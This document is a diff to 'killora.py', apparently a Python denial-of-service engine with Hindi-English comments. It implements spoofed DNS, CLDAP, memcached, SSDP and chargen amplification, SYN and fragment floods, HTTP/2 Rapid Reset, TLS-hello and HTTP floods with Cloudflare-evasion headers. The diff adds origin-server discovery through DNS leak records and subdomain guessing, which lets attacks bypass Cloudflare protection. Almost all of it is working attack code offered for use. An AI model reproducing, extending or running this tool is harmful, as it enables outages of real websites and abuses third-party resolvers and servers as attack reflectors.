@@ -1,7 +1,13 @@
 #!/usr/bin/env python3
 # killora.py - engine for Killora by BrokenCodeZ
-import asyncio, ctypes, ipaddress, multiprocessing as mp, os, random
+import asyncio, ctypes, ipaddress, multiprocessing as mp, os, random, re
 import resource, socket, ssl, struct, sys, time
+
+try:
+    import dns.resolver as dnsres
+    HAVE_DNS = True
+except ImportError:
+    HAVE_DNS = False
 
 CF_NETS = [ipaddress.ip_network(n) for n in (
     "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
@@ -11,9 +17,10 @@ CF_NETS = [ipaddress.ip_network(n) for n in (
 CF_PORTS = [443, 2053, 2083, 2087, 2096, 8443, 80, 8080, 8880, 2052,
             2082, 2086, 2095]
 TLS_PORTS = {443, 2053, 2083, 2087, 2096, 8443}
-SUBS = ["direct", "origin", "origin-www", "direct-www", "ftp", "mail", "ssh",
-        "cpanel", "webmail", "dev", "staging", "api", "backend", "old", "new",
-        "server", "host", "portal", "admin", "vpn", "internal", "gateway"]
+SUBS = ["direct", "origin", "origin-www", "direct-www", "www", "ftp", "mail",
+        "smtp", "ssh", "cpanel", "webmail", "dev", "staging", "api", "backend",
+        "old", "new", "server", "host", "portal", "admin", "vpn", "internal",
+        "gateway", "ns1", "ns2"]
 AMP_NAMES = ["isc.org", "ripe.net", "nic.cz", "ietf.org", "nlnetlabs.nl",
              "denic.de", "switch.ch", "nic.fr", "nominet.uk"]
 RESOLVERS = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9",
@@ -25,14 +32,11 @@ RESOLVERS = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9",
              "216.146.35.35", "216.146.36.36", "198.101.242.72",
              "23.253.163.53", "91.239.100.100", "89.233.43.71",
              "194.242.2.2", "146.112.61.106", "18.194.105.124"]
-# CLDAP rootDSE - 52 byte request, 1-3 KB reply
-CLDAP = bytes.fromhex(
-    "3025020101632004000a01000a0100020100020100010100870b6f626a6563"
-    "74636c61737330 00".replace(" ", ""))
+CLDAP = bytes.fromhex("3025020101632004000a01000a0100020100020100010100870b6f626a656374636c6173733000")
 SSDP = (b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
         b'MAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n')
 MEMC = b"\x00\x00\x00\x00\x00\x01\x00\x00stats slabs\r\n"
-RIP = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + b"\x00" * 12
+RIP = b"\x01\x01\x00\x00" + b"\x00" * 20
 UA = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
@@ -63,7 +67,6 @@ _MMSZ = ctypes.sizeof(_MMSG)
 
 
 def prep(pkts):
-    """Pre-build ctypes buffers + mmsghdr array. Ek baar, phir loop me sirf send."""
     n = len(pkts)
     bufs = [ctypes.create_string_buffer(p, len(p)) for p in pkts]
     iovs = (_IOV * n)()
@@ -77,14 +80,12 @@ def prep(pkts):
 
 
 def blast(sock, p, chunk=64):
-    """Zero-alloc send loop. syscall me 64 packet."""
     _, _, msgs, n = p
     total = 0
     for off in range(0, n, chunk):
         cnt = min(chunk, n - off)
         try:
-            r = LIBC.sendmmsg(sock.fileno(),
-                              ctypes.byref(msgs, off * _MMSZ), cnt, 0)
+            r = LIBC.sendmmsg(sock.fileno(), ctypes.byref(msgs, off * _MMSZ), cnt, 0)
         except Exception:
             r = -1
         if r > 0:
@@ -101,8 +102,10 @@ class Cfg:
         self.fail = 0
         self.bytes = 0
         self.ip = None
+        self.cf = False
         self.origins = []
         self.stop = False
+        self.codes = {}
         self.t0 = time.monotonic()
         self.deadline = self.t0 + dur
         self.shared = None
@@ -156,8 +159,8 @@ def rnd_ip():
 
 def ip_hdr(src, dst, proto, total, flags=0x4000):
     h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, random.randint(0, 65535),
-                     flags, random.randint(48, 128), proto, 0,
-                     socket.inet_aton(src), socket.inet_aton(dst))
+                    flags, random.randint(48, 128), proto, 0,
+                    socket.inet_aton(src), socket.inet_aton(dst))
     return h[:10] + struct.pack("!H", csum(h)) + h[12:]
 
 
@@ -175,12 +178,9 @@ def tcp_pkt(src, dst, sp, dp, flags, opts=b""):
     return ip + tcp
 
 
-def udp_pkt(src, dst, sp, dp, payload, zero_csum=False):
-    total = 20 + 8 + len(payload)
-    ip = ip_hdr(src, dst, socket.IPPROTO_UDP, total)
+def udp_pkt(src, dst, sp, dp, payload):
+    ip = ip_hdr(src, dst, socket.IPPROTO_UDP, 20 + 8 + len(payload))
     u = struct.pack("!HHHH", sp, dp, 8 + len(payload), 0) + payload
-    if zero_csum:
-        return ip + u
     ph = struct.pack("!4s4sBBH", socket.inet_aton(src), socket.inet_aton(dst),
                      0, socket.IPPROTO_UDP, len(u))
     u = u[:6] + struct.pack("!H", csum(ph + u)) + u[8:]
@@ -190,15 +190,13 @@ def udp_pkt(src, dst, sp, dp, payload, zero_csum=False):
 def dns_pkt(src, res, name, qtype=48):
     h = struct.pack("!HHHHHH", random.randint(0, 65535), 0x0100, 1, 0, 0, 1)
     q = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"
-    q += struct.pack("!HH", qtype, 1)
-    q += b"\x00" + struct.pack("!HHIH", 41, 4096, 0, 0)
+    q += struct.pack("!HH", qtype, 1) + b"\x00" + struct.pack("!HHIH", 41, 4096, 0, 0)
     return udp_pkt(src, res, 53, 53, h + q)
 
 
 def frag_pkts(src, dst, dp):
     data = os.urandom(2700)
-    payload = struct.pack("!HHHH", random.randint(1024, 65535), dp,
-                          8 + len(data), 0) + data
+    payload = struct.pack("!HHHH", random.randint(1024, 65535), dp, 8 + len(data), 0) + data
     out = []
     for i in range(0, len(payload), 1400):
         chunk = payload[i:i + 1400]
@@ -252,12 +250,14 @@ def tls_ctx():
     return c
 
 
-def req_bytes(host, post=False, size=0):
+def req_bytes(host, post=False, size=0, close=False):
     m = "POST" if post else "GET"
-    h = ["%s /?%s HTTP/1.1" % (m, bust()), "Host: " + host,
+    path = "/%s/?%s" % (bust(), bust())
+    h = ["%s %s HTTP/1.1" % (m, path), "Host: " + host,
          "User-Agent: " + random.choice(UA), "Accept: */*",
-         "Accept-Encoding: gzip, deflate, br", "Connection: keep-alive",
-         "Cache-Control: no-cache", "Pragma: no-cache",
+         "Accept-Encoding: gzip, deflate, br",
+         "Connection: " + ("close" if close else "keep-alive"),
+         "Cache-Control: no-store", "Pragma: no-cache",
          "Referer: https://" + host + "/"]
     for k, v in cf_headers().items():
         h.append("%s: %s" % (k, v))
@@ -270,9 +270,10 @@ def req_bytes(host, post=False, size=0):
 
 
 def pick_target(cfg):
-    if cfg.origins and random.random() < 0.72:
+    """CF pe hai to edge, origin mila to origin, warna seedha IP."""
+    if cfg.origins and random.random() < 0.75:
         return random.choice(cfg.origins), cfg.port
-    if EDGE and random.random() < 0.92:
+    if cfg.cf and EDGE and random.random() < 0.9:
         return random.choice(EDGE), random.choice(CF_PORTS)
     return cfg.ip, cfg.port
 
@@ -289,13 +290,11 @@ def raw_sock(proto=socket.IPPROTO_RAW):
 
 
 def amp_build(kind, target, n=384):
-    """Pre-built amp batch. src = target (spoof), reply target pe jayegi."""
     out = []
     for _ in range(n):
         if kind == "dns":
             out.append(dns_pkt(target, random.choice(RESOLVERS),
-                               random.choice(AMP_NAMES),
-                               random.choice((48, 255, 16))))
+                               random.choice(AMP_NAMES), random.choice((48, 255, 16))))
         elif kind == "cldap":
             out.append(udp_pkt(target, random.choice(RESOLVERS), 389, 389, CLDAP))
         elif kind == "memcache":
@@ -330,8 +329,7 @@ async def syn_worker(cfg, cache):
     except OSError:
         pass
     while cfg.live():
-        n = blast(s, cache)
-        cfg.sent += n
+        cfg.sent += blast(s, cache)
         await asyncio.sleep(0)
 
 
@@ -343,7 +341,7 @@ async def frag_worker(cfg):
         pass
     while cfg.live():
         pk = []
-        for _ in range(64):
+        for _ in range(32):
             pk.extend(frag_pkts(rnd_ip(), cfg.ip, cfg.port))
         cfg.sent += blast(s, prep(pk))
         await asyncio.sleep(0)
@@ -374,29 +372,62 @@ async def tlshello_worker(cfg, pool):
             cfg.sent += 1
 
 
-async def pipe_worker(cfg, pool, post, size):
+async def keep_worker(cfg, pool, post, size):
+    """Connection hold karke pipeline - handshake cost amortize."""
     while cfg.live():
         ip, port = pick_target(cfg)
         ctx = tls_ctx() if port in TLS_PORTS else None
         try:
             r, w = await asyncio.wait_for(
                 asyncio.open_connection(ip, port, ssl=ctx,
-                                        server_hostname=cfg.host if ctx else None), 5)
-            for _ in range(32):
+                                        server_hostname=cfg.host if ctx else None), 6)
+        except Exception:
+            cfg.fail += 1
+            continue
+        sock = w.get_extra_info("socket")
+        if sock is not None:
+            try:
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 << 20)
+            except OSError:
+                pass
+        try:
+            for _ in range(300):
                 if not cfg.live():
                     break
                 w.write(random.choice(pool))
                 cfg.sent += 1
-                cfg.bytes += 400 + (size if post else 0)
-            await asyncio.wait_for(w.drain(), 5)
-            w.close()
+                cfg.bytes += 420 + (size if post else 0)
+                if cfg.sent % 16 == 0:
+                    await asyncio.wait_for(w.drain(), 6)
+            await asyncio.wait_for(w.drain(), 6)
         except Exception:
             cfg.fail += 1
-            cfg.sent += 1
+        finally:
+            w.close()
+
+
+async def http_worker(cfg, session, sem, cf):
+    scheme = "https" if cfg.port in TLS_PORTS else "http"
+    base = "%s://%s:%d/" % (scheme, cfg.host, cfg.port)
+    while cfg.live():
+        h = {"User-Agent": random.choice(UA), "Accept": "*/*",
+             "Connection": "keep-alive", "Cache-Control": "no-store",
+             "Referer": base}
+        if cf:
+            h.update(cf_headers())
+        async with sem:
+            try:
+                async with session.get(base + bust() + "?" + bust(), headers=h,
+                                       allow_redirects=False, timeout=None) as r:
+                    cfg.codes[r.status] = cfg.codes.get(r.status, 0) + 1
+                    await r.content.read(1024)
+                    cfg.sent += 1
+            except Exception:
+                cfg.fail += 1
+                cfg.sent += 1
 
 
 async def h2reset_worker(cfg, host):
-    """HTTP/2 Rapid Reset - stream kholo, turant RST. Bytes ~nil, server pe state banta hai."""
     import h2.connection, h2.config
     while cfg.live():
         ip, port = pick_target(cfg)
@@ -411,18 +442,18 @@ async def h2reset_worker(cfg, host):
             c.initiate_connection()
             c.update_settings({h2.connection.H2Settings.MAX_CONCURRENT_STREAMS: 1000})
             w.write(c.data_to_send())
-            for _ in range(200):
+            for _ in range(250):
                 if not cfg.live():
                     break
                 sid = c.get_next_available_stream_id()
                 c.send_headers(sid, [(":method", "POST"), (":authority", host),
-                                     (":scheme", "https"), (":path", "/?" + bust()),
+                                     (":scheme", "https"), (":path", "/" + bust()),
                                      ("content-length", "16")], end_stream=False)
                 c.send_data(sid, os.urandom(16))
                 c.reset_stream(sid)
                 w.write(c.data_to_send())
                 cfg.sent += 1
-                cfg.bytes += 180
+                cfg.bytes += 190
             await asyncio.wait_for(w.drain(), 6)
             w.close()
         except Exception:
@@ -445,12 +476,12 @@ async def h2_worker(cfg, host):
                                                  header_encoding="utf-8"))
             c.initiate_connection()
             w.write(c.data_to_send())
-            for _ in range(24):
+            for _ in range(32):
                 if not cfg.live():
                     break
                 sid = c.get_next_available_stream_id()
                 c.send_headers(sid, [(":method", "POST"), (":authority", host),
-                                     (":scheme", "https"), (":path", "/?" + bust()),
+                                     (":scheme", "https"), (":path", "/" + bust()),
                                      ("content-type", "application/octet-stream"),
                                      ("content-length", str(len(body)))])
                 c.send_data(sid, body)
@@ -506,20 +537,60 @@ async def slow_worker(cfg):
             cfg.sent += 1
 
 
-async def hunt(cfg):
-    loop = asyncio.get_running_loop()
-    for sub in SUBS:
-        if cfg.stop:
-            return
+# ---------------- origin hunt ----------------
+def dns_leak_ips(domain):
+    """MX / SPF(TXT) / NS records - asli origin leak vectors."""
+    out = []
+    if not HAVE_DNS:
+        return out
+    for rtype in ("MX", "TXT", "NS"):
         try:
-            ips = await loop.run_in_executor(None, resolve, "%s.%s" % (sub, cfg.host))
+            for r in dnsres.resolve(domain, rtype, lifetime=3):
+                s = str(r)
+                for ip in re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", s):
+                    out.append(ip)
+                if rtype in ("MX", "NS"):
+                    h = s.split()[-1].rstrip(".")
+                    out.extend(resolve(h))
         except Exception:
             continue
-        for ip in ips:
-            if is_cf(ip) or ip in cfg.origins:
-                continue
+    return out
+
+
+def tunnel_detect(domain):
+    if not HAVE_DNS:
+        return False
+    try:
+        for r in dnsres.resolve(domain, "CNAME", lifetime=3):
+            if "cfargotunnel.com" in str(r).lower():
+                return True
+    except Exception:
+        pass
+    return False
+
+
+async def hunt(cfg):
+    loop = asyncio.get_running_loop()
+    def scan():
+        found = []
+        for ip in dns_leak_ips(cfg.host):
+            if not is_cf(ip) and ip not in found:
+                found.append(ip)
+        for sub in SUBS:
+            for ip in resolve("%s.%s" % (sub, cfg.host)):
+                if not is_cf(ip) and ip not in found:
+                    found.append(ip)
+        return found
+    try:
+        found = await loop.run_in_executor(None, scan)
+    except Exception:
+        return
+    for ip in found:
+        if ip not in cfg.origins:
             cfg.origins.append(ip)
-            print("  %s[+]%s origin %s -> %s" % (C4, N, sub, ip), flush=True)
+            print("  %s[+]%s ORIGIN -> %s" % (C4, N, ip), flush=True)
+    if not found:
+        print("  %s[-]%s origin nahi mila - CF edge pe hi chal raha hai" % (CR, N), flush=True)
 
 
 async def maxmode(cfg, root):
@@ -530,23 +601,22 @@ async def maxmode(cfg, root):
     t = []
     if root:
         for kind in ("dns", "cldap", "memcache", "chargen"):
-            cache = amp_build(kind, cfg.ip)
-            t.append(asyncio.create_task(amp_worker(cfg, kind, cache)))
+            t.append(asyncio.create_task(amp_worker(cfg, kind, amp_build(kind, cfg.ip))))
         t.append(asyncio.create_task(amp_worker(cfg, "ssdp", amp_build("ssdp", cfg.ip))))
-        t.append(asyncio.create_task(syn_worker(
-            cfg, prep([tcp_pkt(rnd_ip(), cfg.ip, random.randint(1024, 65535),
-                               cfg.port, 0x02, SYN_OPTS) for _ in range(384)]))))
+        t.append(asyncio.create_task(syn_worker(cfg, prep(
+            [tcp_pkt(rnd_ip(), cfg.ip, random.randint(1024, 65535), cfg.port,
+                     0x02, SYN_OPTS) for _ in range(384)]))))
         t.append(asyncio.create_task(frag_worker(cfg)))
-    for _ in range(4):
-        t.append(asyncio.create_task(h2reset_worker(cfg, cfg.host)))
     for _ in range(5):
-        t.append(asyncio.create_task(pipe_worker(cfg, post, True, 8192)))
+        t.append(asyncio.create_task(h2reset_worker(cfg, cfg.host)))
+    for _ in range(6):
+        t.append(asyncio.create_task(keep_worker(cfg, post, True, 8192)))
+    for _ in range(5):
+        t.append(asyncio.create_task(keep_worker(cfg, get, False, 0)))
     for _ in range(4):
         t.append(asyncio.create_task(tlshello_worker(cfg, hello)))
-    for _ in range(3):
+    for _ in range(2):
         t.append(asyncio.create_task(h2_worker(cfg, cfg.host)))
-    for _ in range(3):
-        t.append(asyncio.create_task(pipe_worker(cfg, get, False, 0)))
     await asyncio.gather(*t, return_exceptions=True)
     ht.cancel()
 
@@ -567,9 +637,10 @@ async def flush(cfg):
 
 def summary(cfg):
     el = time.monotonic() - cfg.t0
-    print("\n  %sDONE%s sent=%d fail=%d %.1fs avg=%.0f/s %.1fMB"
+    codes = " ".join("%d:%d" % (k, v) for k, v in sorted(cfg.codes.items())) or "-"
+    print("\n  %sDONE%s sent=%d fail=%d %.1fs avg=%.0f/s %.1fMB  codes=%s"
           % (C4, N, cfg.sent, cfg.fail, el, cfg.sent / max(el, .01),
-             cfg.bytes / 1e6), flush=True)
+             cfg.bytes / 1e6, codes), flush=True)
 
 
 async def drive(cfg, worker):
@@ -584,11 +655,11 @@ async def drive(cfg, worker):
 
 def need_root():
     if os.geteuid() != 0:
-        print(CR + "  root chahiye (spoofing)" + N)
+        print(CR + "  root chahiye" + N)
         sys.exit(1)
 
 
-def child(mode, host, port, count, dur, cpu):
+def child(mode, host, port, count, dur, cpu, iscloud):
     try:
         resource.setrlimit(resource.RLIMIT_NOFILE, (1 << 20, 1 << 20))
         if cpu is not None:
@@ -597,6 +668,7 @@ def child(mode, host, port, count, dur, cpu):
     except Exception:
         pass
     cfg = Cfg(host, port, count, dur)
+    cfg.cf = iscloud
     ips = resolve(host)
     if not ips:
         print(CR + "  resolve fail" + N, flush=True)
@@ -606,7 +678,7 @@ def child(mode, host, port, count, dur, cpu):
 
     if mode == "max":
         asyncio.run(drive(cfg, lambda: maxmode(cfg, root)))
-    elif mode in ("dnsamp", "cldapamp", "memcacheamp", "ssdpamp", "chargenamp", "ripamp"):
+    elif mode.endswith("amp"):
         kind = mode.replace("amp", "")
         cache = amp_build(kind, cfg.ip)
         asyncio.run(drive(cfg, lambda: asyncio.gather(
@@ -635,10 +707,21 @@ def child(mode, host, port, count, dur, cpu):
     elif mode == "h2":
         asyncio.run(drive(cfg, lambda: asyncio.gather(
             *[h2_worker(cfg, host) for _ in range(40)])))
-    elif mode == "http":
-        pool = [req_bytes(host) for _ in range(192)]
+    elif mode == "keep":
+        pool = [req_bytes(host, False, 0) for _ in range(192)]
         asyncio.run(drive(cfg, lambda: asyncio.gather(
-            *[pipe_worker(cfg, pool, False, 0) for _ in range(300)])))
+            *[keep_worker(cfg, pool, False, 0) for _ in range(300)])))
+    elif mode in ("http", "probe"):
+        import aiohttp
+        conn = aiohttp.TCPConnector(limit=0, ssl=tls_ctx(), force_close=False,
+                                    enable_cleanup_closed=True)
+        sem = asyncio.Semaphore(400)
+        n = 50 if mode == "probe" else 400
+        async def go():
+            async with aiohttp.ClientSession(connector=conn) as s:
+                await drive(cfg, lambda: asyncio.gather(
+                    *[http_worker(cfg, s, sem, True) for _ in range(n)]))
+        asyncio.run(go())
     elif mode == "slow":
         asyncio.run(drive(cfg, lambda: asyncio.gather(
             *[slow_worker(cfg) for _ in range(2)])))
@@ -656,27 +739,40 @@ def main():
     ips = resolve(host)
     if not ips:
         sys.exit(CR + "  resolve fail: " + host + N)
+    iscloud = any(is_cf(i) for i in ips)
+
+    print("  IPs        : " + ", ".join(ips[:4]))
+    print("  Cloudflare : " + (CR + "YES - edge/tunnel" + N if iscloud
+                               else C4 + "NO - direct" + N))
+    if iscloud:
+        if tunnel_detect(host):
+            print("  Tunnel     : " + CR + "cfargotunnel (origin hidden)" + N)
+        print("  Routing    : CF edge IPs + alt ports")
+    else:
+        print("  Routing    : " + C4 + "seedha target IP" + N + " (CF pool skip)")
 
     if mode == "check":
-        print("  IPs: " + ", ".join(ips))
-        print("  Cloudflare: " + (CR + "YES" + N if any(is_cf(i) for i in ips) else C4 + "NO" + N))
+        print("\n  leak vectors:")
+        for ip in dns_leak_ips(host):
+            print("   %s%s" % (C4 + " + " + N, ip))
         for sub in SUBS:
             for ip in resolve("%s.%s" % (sub, host)):
                 if not is_cf(ip):
-                    print("  %s[+]%s %s -> %s" % (C4, N, sub, ip))
+                    print("   %s%s -> %s" % (C4 + " + " + N, sub, ip))
         return
 
     if mode in ("max", "syn", "frag", "icmp") or mode.endswith("amp"):
         need_root()
 
-    build_edge_pool()
+    if iscloud:
+        build_edge_pool()
     ncpu = os.cpu_count() or 1
 
     chunk = max(count // procs, 1) if count else 0
     jobs = []
     for i in range(procs):
         n = (chunk if i < procs - 1 else max(count - chunk * (procs - 1), 1)) if count else 0
-        p = mp.Process(target=child, args=(mode, host, port, n, dur, i % ncpu))
+        p = mp.Process(target=child, args=(mode, host, port, n, dur, i % ncpu, iscloud))
         p.start()
         jobs.append(p)
 
@@ -684,9 +780,8 @@ def main():
     try:
         while any(p.is_alive() for p in jobs):
             time.sleep(1)
-            print("  %s[%5.1fs]%s %d procs live" % (C1, time.monotonic() - t0, N,
-                                                    sum(p.is_alive() for p in jobs)),
-                  flush=True)
+            print("  %s[%5.1fs]%s %d procs" % (C1, time.monotonic() - t0, N,
+                                               sum(p.is_alive() for p in jobs)), flush=True)
     except KeyboardInterrupt:
         for p in jobs:
             p.terminate()
